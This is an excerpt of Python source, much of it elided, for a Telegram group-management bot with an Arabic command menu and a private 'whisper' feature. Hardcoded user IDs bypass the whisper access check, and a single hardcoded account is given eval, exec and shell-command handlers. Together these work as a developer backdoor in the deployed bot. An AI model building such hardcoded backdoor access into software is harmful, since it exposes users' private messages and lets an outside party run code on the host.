...
async def open_hms(c: Client, m: Message):
   ...
   if not wsdb.get(f"hms-{id}"):
      ...
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 1260465030 and m.from_user.id != 8087077168:
...
'''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_Zaid}:UsersList')))
  ...
  if text == '/start Commands':
    return await m.reply(text='• أهلا بك في عالم الأوامر المتكاملة :\n━━━━━━━━━━━━━━━━\n◈ 「 م 𝟭 」 ↤︎ الحماية والقفل\n◈ 「 م 𝟮 」 ↤︎ التفعيل والتعطيل\n◈ 「 م 𝟯 」 ↤︎ الإدارة والضبط\n◈ 「 م 𝟰 」 ↤︎ التسلية والألعاب\n◈ 「 م 𝟱 」 ↤︎ المطورين والسودو\n━━━━━━━━━━━━━━━━\n◈ اختر ما تريده من الأزرار بالأسفل 🧚‍♀️',
         reply_markup=InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton ('◈ م 𝟭 ◈', callback_data=f'commands1:{m.from_user.id}'),
               InlineKeyboardButton ('◈ م 𝟮 ◈', callback_data=f'commands2:{m.from_user.id}')
             ],
             [
              InlineKeyboardButton ('◈ م 𝟯 ◈', callback_data=f'commands3:{m.from_user.id}'),
             ],
             [
...
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name} 🍻", url=f't.me/{channel}')]]))
  ...
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     reply_markup = ReplyKeyboardMarkup(
      ...
      placeholder='@ysgxixbot - @Tepthon 🧚‍♀️'
     )
     if m.from_user.id == 8087077168 or m.from_user.id == 1260465030:
       rank = 'تاج راسي ☆'
     else:
...
@Client.on_message(filters.command("eval") & filters.user(8087077168))
...
@Client.on_message(filters.command("exec") & filters.user(8087077168))
...
@Client.on_message(filters.command("cmd") & filters.user(8087077168))
...
@Client.on_message(filters.command("print") & filters.user(8087077168))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(8087077168))
